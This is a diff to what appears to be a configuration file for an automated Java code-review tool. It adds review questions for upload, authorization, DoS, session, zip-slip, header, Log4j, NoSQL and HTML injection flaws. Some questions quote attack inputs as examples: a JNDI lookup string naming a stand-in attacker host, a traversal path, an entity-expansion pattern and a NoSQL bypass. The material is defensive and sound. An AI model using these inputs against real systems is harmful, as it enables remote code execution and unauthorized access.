@@ -404,3 +404,279 @@ java/certificate-validation-disabled:
     - "Could an attacker perform a MAN-IN-THE-MIDDLE attack by presenting a forged certificate?"
   context_hint: "Include SSLContext setup, TrustManager, HostnameVerifier, and what data is transmitted."
   additional_context: ["caller"]
+
+# ==============================================================================
+# Java - File Upload and Input Validation (CWE-434, CWE-20)
+# ==============================================================================
+
+java/file-upload:
+  short_description: "Unrestricted file upload via MultipartFile or Part without type/size validation (CWE-434)"
+  questions:
+    - "Where does the uploaded file come from — MultipartFile, javax.servlet.http.Part, or a multipart request body?"
+    - "Is the file's CONTENT TYPE validated server-side (not just the client-provided Content-Type header, which is attacker-controlled)?"
+    - "Is the file EXTENSION checked against an allowlist of safe types (e.g., .png, .jpg, .pdf) rather than a denylist?"
+    - "Is the file saved to a location OUTSIDE the web root, or could an attacker upload a .jsp/.war file that the server will execute?"
+    - "Is the filename SANITIZED to prevent path traversal (../) and overwriting existing files?"
+    - "Is there a maximum file SIZE enforced server-side (not just client-side) to prevent DoS via large uploads?"
+  context_hint: "Include the upload handler, file storage path, and any validation logic."
+  additional_context: ["caller"]
+
+java/input-validation:
+  short_description: "User input used without validation allowing unexpected values (CWE-20)"
+  questions:
+    - "Where does the INPUT originate — @RequestParam, @RequestBody, @PathVariable, @RequestHeader?"
+    - "Is @Valid or @Validated used on the DTO/entity with Bean Validation constraints (@NotNull, @Size, @Pattern)?"
+    - "If no Bean Validation, is MANUAL validation performed — null checks, range checks, format checks — before the input is used?"
+    - "Could unexpected values (negative numbers, empty strings, extremely long strings, special characters) cause incorrect behavior?"
+    - "Is the input used in security-sensitive operations (authorization decisions, file paths, queries) where bad values have security impact?"
+    - "Does the controller have a @ControllerAdvice or MethodArgumentNotValidException handler to reject invalid input?"
+  context_hint: "Include the controller method signature, DTO class with annotations, and how input is used."
+  additional_context: ["caller", "classes"]
+
+# ==============================================================================
+# Java - Authentication and Authorization (CWE-306, CWE-862, CWE-863, CWE-287)
+# ==============================================================================
+
+java/missing-authentication:
+  short_description: "Endpoint accessible without authentication performing privileged actions (CWE-306)"
+  questions:
+    - "Does this endpoint perform a PRIVILEGED action — data modification, admin operation, sensitive data access?"
+    - "Is the endpoint listed in Spring Security's permitAll() or ignored in the security filter chain?"
+    - "Is there an @PreAuthorize, @Secured, @RolesAllowed annotation, or manual SecurityContext check on this method?"
+    - "Could an UNAUTHENTICATED user reach this endpoint by directly calling its URL?"
+    - "Is this endpoint intentionally public (health check, login page, public API) or was authentication accidentally omitted?"
+    - "Is there a global security configuration (WebSecurityConfigurerAdapter, SecurityFilterChain) that should protect this path?"
+  context_hint: "Include the controller method, Spring Security configuration, and any authentication annotations."
+  additional_context: ["caller", "classes"]
+
+java/missing-authorization:
+  short_description: "Authenticated endpoint missing role or permission check (CWE-862)"
+  questions:
+    - "Does this endpoint perform an action that should be restricted to specific ROLES or PERMISSIONS?"
+    - "Is @PreAuthorize('hasRole(...)'), @Secured, @RolesAllowed, or manual authority check present?"
+    - "Could an authenticated user with LOW privileges access this endpoint and perform actions reserved for ADMIN or higher roles?"
+    - "Is there object-level authorization — does the code verify the user OWNS the resource they are accessing/modifying?"
+    - "Is the authorization check performed BEFORE the business logic executes, or could the action complete before the check?"
+    - "Is Spring Method Security enabled (@EnableGlobalMethodSecurity or @EnableMethodSecurity) in the configuration?"
+  context_hint: "Include the controller method, security annotations, and how the user's role/authority is checked."
+  additional_context: ["caller", "classes"]
+
+java/incorrect-authorization:
+  short_description: "Authorization check performed on wrong object or with incorrect logic (CWE-863)"
+  questions:
+    - "What RESOURCE or OBJECT is the user trying to access — does the authorization check verify ownership/permission on THAT specific object?"
+    - "Is the authorization check using the resource ID from the URL/request (attacker-controlled) to look up the resource, then checking ownership?"
+    - "Could an attacker change the resource ID in the request to access ANOTHER user's data (Insecure Direct Object Reference / IDOR)?"
+    - "Is the role/permission check using the correct enum/string — could a typo or case mismatch cause the check to always pass or fail?"
+    - "Are compound authorization conditions (role AND ownership, role OR specific permission) implemented with correct boolean logic?"
+    - "Is the authorization check consistent across all endpoints that access this resource (GET, PUT, DELETE)?"
+  context_hint: "Include the authorization check, resource lookup, and all endpoints accessing this resource."
+  additional_context: ["caller", "classes"]
+
+java/broken-authentication:
+  short_description: "Weak authentication mechanism allowing credential compromise (CWE-287)"
+  questions:
+    - "Is password comparison done with a constant-time function, or could timing attacks reveal password characters?"
+    - "Is there BRUTE FORCE protection — account lockout, rate limiting, CAPTCHA after failed attempts?"
+    - "Are passwords hashed with BCryptPasswordEncoder, SCryptPasswordEncoder, or Argon2 — NOT MD5, SHA-1, or plain SHA-256?"
+    - "Is the authentication state stored securely — HttpSession with secure cookie, or JWT with proper signing?"
+    - "Could an attacker bypass authentication via parameter manipulation, default credentials, or missing auth checks on alternate paths?"
+    - "Is multi-factor authentication available for high-privilege accounts?"
+  context_hint: "Include the authentication flow, password verification, and session creation logic."
+  additional_context: ["caller", "classes"]
+
+java/improper-privilege-management:
+  short_description: "Privilege escalation via role manipulation or missing privilege boundary (CWE-269)"
+  questions:
+    - "Can a user MODIFY their own role or privilege level through an API endpoint (e.g., changing role field in profile update)?"
+    - "Is the role/privilege assignment protected by authorization checks — only admins can grant admin roles?"
+    - "Could mass assignment (binding all request fields to entity) allow setting role/admin fields not intended for user modification?"
+    - "Is there a privilege boundary between user types (regular user, moderator, admin) that is consistently enforced?"
+    - "Are elevated privileges granted temporarily and properly revoked (e.g., @RunAs, SecurityContext manipulation)?"
+    - "Could an attacker create a new account with elevated privileges by manipulating registration parameters?"
+  context_hint: "Include role assignment logic, user update endpoints, and privilege check code."
+  additional_context: ["caller", "classes"]
+
+# ==============================================================================
+# Java - Resource Exhaustion and DoS (CWE-770, CWE-776, CWE-1333)
+# ==============================================================================
+
+java/resource-exhaustion:
+  short_description: "Unbounded resource allocation from user-controlled input enabling DoS (CWE-770)"
+  questions:
+    - "Is the SIZE or COUNT of an allocation (array, list, buffer, thread pool) controlled by user input without an upper bound?"
+    - "Could an attacker send a request with size=2147483647 to cause OutOfMemoryError or extreme CPU consumption?"
+    - "Is there a server-side MAXIMUM enforced — @Max annotation, manual bounds check, or configuration limit?"
+    - "Is pagination enforced on database queries — could an attacker request page_size=1000000 to exhaust memory?"
+    - "Are streaming APIs used for large data (InputStream, Flux) instead of loading everything into memory?"
+    - "Is there a request timeout, memory limit, or circuit breaker that would prevent a single request from consuming excessive resources?"
+  context_hint: "Include the allocation site, user input source, and any size validation."
+  additional_context: ["caller"]
+
+java/xml-bomb:
+  short_description: "XML entity expansion causing exponential memory consumption (Billion Laughs / CWE-776)"
+  questions:
+    - "Is XML input from an UNTRUSTED source parsed with a factory that allows DOCTYPE declarations?"
+    - "Is XMLConstants.FEATURE_SECURE_PROCESSING set to true on the parser factory?"
+    - "Is the maximum entity expansion limit configured (jdk.xml.entityExpansionLimit system property)?"
+    - "Could an attacker send nested entity definitions (<!ENTITY a '&b;&b;'>) to cause exponential memory growth?"
+    - "Is FEATURE_DISALLOW_DOCTYPE_DECL set to true (strongest protection against both XXE and entity expansion)?"
+    - "What is the impact — OutOfMemoryError crashing the server, or is parsing done in a sandboxed/limited context?"
+  context_hint: "Include XML parser factory configuration and the source of XML input."
+  additional_context: ["caller"]
+
+java/regex-dos:
+  short_description: "Regular expression vulnerable to catastrophic backtracking on attacker input (CWE-1333)"
+  questions:
+    - "Does the REGEX PATTERN contain nested quantifiers (e.g., (a+)+, (a|b)*c*), overlapping alternations, or back-references?"
+    - "Is the INPUT to Pattern.matcher() user-controlled and could an attacker craft a string causing exponential backtracking?"
+    - "Is there a TIMEOUT or length limit on the input string before it is matched?"
+    - "Could this regex be rewritten to avoid backtracking (e.g., using possessive quantifiers a++, atomic groups, or a simpler pattern)?"
+    - "Is Pattern.compile() called once and reused, or is it compiled per-request (additional overhead)?"
+    - "What is the impact — thread blocked for seconds/minutes, connection pool exhaustion, full server DoS?"
+  context_hint: "Include the regex pattern, input source, and where the match result is used."
+  additional_context: []
+
+# ==============================================================================
+# Java - Session and Cookie Security (CWE-384, CWE-1021, CWE-942)
+# ==============================================================================
+
+java/session-fixation:
+  short_description: "Session not invalidated after login allowing session fixation attack (CWE-384)"
+  questions:
+    - "Is HttpSession.invalidate() called BEFORE creating a new session after successful authentication?"
+    - "Does Spring Security's SessionFixationProtection strategy use migrateSession() or newSession() (both are safe)?"
+    - "Could an attacker set a session cookie (via XSS, subdomain cookie, or URL rewriting) BEFORE the victim logs in?"
+    - "Is session.changeSessionId() (Servlet 3.1+) used as an alternative to full invalidation?"
+    - "Is the session ID regenerated on every privilege level change (login, role escalation, password change)?"
+    - "Is Spring Security's sessionFixation() explicitly configured, or is the default (migrateSession) relied upon?"
+  context_hint: "Include the authentication handler, session management code, and Spring Security session configuration."
+  additional_context: ["caller", "classes"]
+
+java/clickjacking:
+  short_description: "Missing frame protection headers allowing clickjacking attacks (CWE-1021)"
+  questions:
+    - "Is the X-Frame-Options header set to DENY or SAMEORIGIN in the HTTP response?"
+    - "Is Content-Security-Policy frame-ancestors directive configured (e.g., frame-ancestors 'self')?"
+    - "Is Spring Security's headers().frameOptions() configured — the default is DENY but is it explicitly disabled?"
+    - "Could an attacker embed this page in an iframe on a malicious site to trick users into clicking hidden buttons?"
+    - "Are there specific pages (OAuth consent, payment, admin actions) where clickjacking would have high impact?"
+    - "Is the protection applied globally via a filter/interceptor, or must each controller set it individually?"
+  context_hint: "Include Spring Security configuration, response header settings, and any global filters."
+  additional_context: ["classes"]
+
+java/cors-misconfiguration:
+  short_description: "Overly permissive CORS configuration allowing cross-origin attacks (CWE-942)"
+  questions:
+    - "Is @CrossOrigin('*') or CorsConfiguration.addAllowedOrigin('*') used to allow ALL origins?"
+    - "Is allowCredentials set to true together with a wildcard origin (this combination is rejected by browsers but indicates intent to be permissive)?"
+    - "Is the allowed origin dynamically set from the request's Origin header without validation (effectively reflecting any origin)?"
+    - "What sensitive operations are exposed via CORS — API endpoints that modify data, return user info, or perform actions?"
+    - "Is the CORS configuration applied globally (WebMvcConfigurer.addCorsMappings) or per-endpoint (@CrossOrigin)?"
+    - "Should origins be restricted to a specific allowlist of trusted domains?"
+  context_hint: "Include CORS configuration, security filter chain, and the endpoints exposed."
+  additional_context: ["classes"]
+
+# ==============================================================================
+# Java - Zip/Archive and Path Security (CWE-22)
+# ==============================================================================
+
+java/zip-slip:
+  short_description: "Archive extraction without validating entry paths allowing directory traversal (CWE-22)"
+  questions:
+    - "Is ZipInputStream, ZipFile, or a library (Apache Commons Compress, java.util.jar) used to extract entries?"
+    - "Is each entry's getName() checked to ensure it does not contain '../' or absolute path components?"
+    - "Is the resolved extraction path validated to be WITHIN the intended destination directory (canonical path comparison)?"
+    - "Could an attacker craft a ZIP with entries like '../../../etc/cron.d/malicious' to write files outside the extraction directory?"
+    - "Is File.getCanonicalPath() or Path.toRealPath() used to resolve symlinks and normalize the path before comparison?"
+    - "What is the impact — overwriting application config, writing a JSP/WAR for RCE, or replacing system files?"
+  context_hint: "Include the archive extraction loop, entry path handling, and destination directory logic."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - Header and Protocol Security (CWE-113, CWE-319, CWE-327)
+# ==============================================================================
+
+java/header-injection:
+  short_description: "CRLF injection in HTTP response header allowing response splitting (CWE-113)"
+  questions:
+    - "Where does the HEADER VALUE originate — request parameter, cookie, database, user profile?"
+    - "Is HttpServletResponse.setHeader(), addHeader(), or addCookie() called with user-controlled data?"
+    - "Could an attacker inject \\r\\n (CRLF) characters to add extra headers or split the HTTP response?"
+    - "Is the value sanitized by stripping or rejecting carriage return and line feed characters?"
+    - "Could response splitting allow an attacker to inject a Set-Cookie header, redirect, or XSS payload?"
+    - "Does the servlet container (Tomcat, Jetty) automatically reject headers with CRLF characters (modern versions do)?"
+  context_hint: "Include the header-setting code and the source of the header value."
+  additional_context: ["caller"]
+
+java/cleartext-transmission:
+  short_description: "Sensitive data transmitted over unencrypted HTTP connection (CWE-319)"
+  questions:
+    - "What SENSITIVE DATA is being transmitted — credentials, tokens, PII, payment information?"
+    - "Is the connection using HTTP instead of HTTPS — URL starts with http:// or no TLS configured?"
+    - "Is Spring Security's requiresChannel().anyRequest().requiresSecure() configured to enforce HTTPS?"
+    - "Is the Strict-Transport-Security (HSTS) header set to prevent future HTTP connections?"
+    - "Could an attacker on the network (public WiFi, ISP, compromised router) intercept this data in transit?"
+    - "Is this for internal service-to-service communication where mTLS or a service mesh provides encryption?"
+  context_hint: "Include the HTTP client configuration, URL construction, and what data is sent."
+  additional_context: ["caller"]
+
+java/insecure-tls-version:
+  short_description: "SSLContext configured with deprecated TLS 1.0/1.1 protocol (CWE-327)"
+  questions:
+    - "Is SSLContext.getInstance() called with 'TLS', 'TLSv1', or 'TLSv1.1' instead of 'TLSv1.2' or 'TLSv1.3'?"
+    - "Is the SSLContext used for client connections, server sockets, or both?"
+    - "Are weak cipher suites (RC4, DES, 3DES, NULL, EXPORT) enabled in the SSLParameters?"
+    - "Does the Java runtime version support TLS 1.2+ and is it configured as the minimum via jdk.tls.client.protocols?"
+    - "What compliance requirements apply — PCI DSS requires TLS 1.2+, NIST recommends TLS 1.3?"
+    - "Is this connecting to a legacy system that only supports older TLS, and is there a migration plan?"
+  context_hint: "Include SSLContext creation, protocol selection, and cipher suite configuration."
+  additional_context: []
+
+# ==============================================================================
+# Java - Logging and Injection (CWE-117)
+# ==============================================================================
+
+java/log4j-injection:
+  short_description: "User-controlled data in Log4j message enabling JNDI lookup injection (CWE-117)"
+  questions:
+    - "Is user-controlled input included in a Log4j log message (logger.info(), logger.error(), etc.) as part of the message string?"
+    - "Is the Log4j version 2.0 through 2.14.1 (vulnerable to Log4Shell / CVE-2021-44228)?"
+    - "Is the log4j2.formatMsgNoLookups system property set to true, or is %m{nolookups} used in the pattern?"
+    - "Could an attacker inject ${jndi:ldap://evil.com/a} in the input to trigger remote class loading?"
+    - "Are input fields that reach log statements sanitized to remove or escape ${ sequences?"
+    - "Is Log4j used via SLF4J with parameterized logging (logger.info('User: {}', username)) — this is still vulnerable in affected versions?"
+  context_hint: "Include the log statement, Log4j version/dependency, and the source of logged data."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - NoSQL Injection (CWE-943)
+# ==============================================================================
+
+java/nosql-injection:
+  short_description: "MongoDB or NoSQL query built from user-controlled input (CWE-943)"
+  questions:
+    - "Where does the INPUT originate — request parameter, request body, path variable?"
+    - "Is the query built using string concatenation or BasicDBObject with user input (vulnerable)?"
+    - "Is Spring Data MongoDB's @Query annotation used with SpEL expressions containing user input?"
+    - "Are MongoDB query operators ($gt, $ne, $regex, $where) injectable through user input?"
+    - "Is MongoTemplate.find() used with a Criteria object built safely from user input?"
+    - "Could an attacker inject {$gt: ''} in a password field to bypass authentication?"
+  context_hint: "Include the query construction, user input source, and MongoDB API usage."
+  additional_context: ["caller", "classes"]
+
+# ==============================================================================
+# Java - HTML Injection (CWE-79 variant)
+# ==============================================================================
+
+java/html-injection:
+  short_description: "User input rendered in HTML template without escaping (CWE-79)"
+  questions:
+    - "Where does the INPUT originate — model attribute, request parameter, database field?"
+    - "Is the template engine's auto-escaping ENABLED and NOT bypassed (Thymeleaf th:utext, JSP <%=, Freemarker ?no_esc)?"
+    - "Is th:text used (safe, auto-escapes) or th:utext (unsafe, renders raw HTML)?"
+    - "For JSP: is <c:out> or fn:escapeXml() used instead of direct expression output (<%= %>)?"
+    - "Could an attacker inject HTML tags to deface the page, create phishing forms, or inject scripts?"
+    - "Is Content-Security-Policy configured to mitigate the impact of any successful injection?"
+  context_hint: "Include the template file, model attribute binding, and output expression."
+  additional_context: ["caller"]
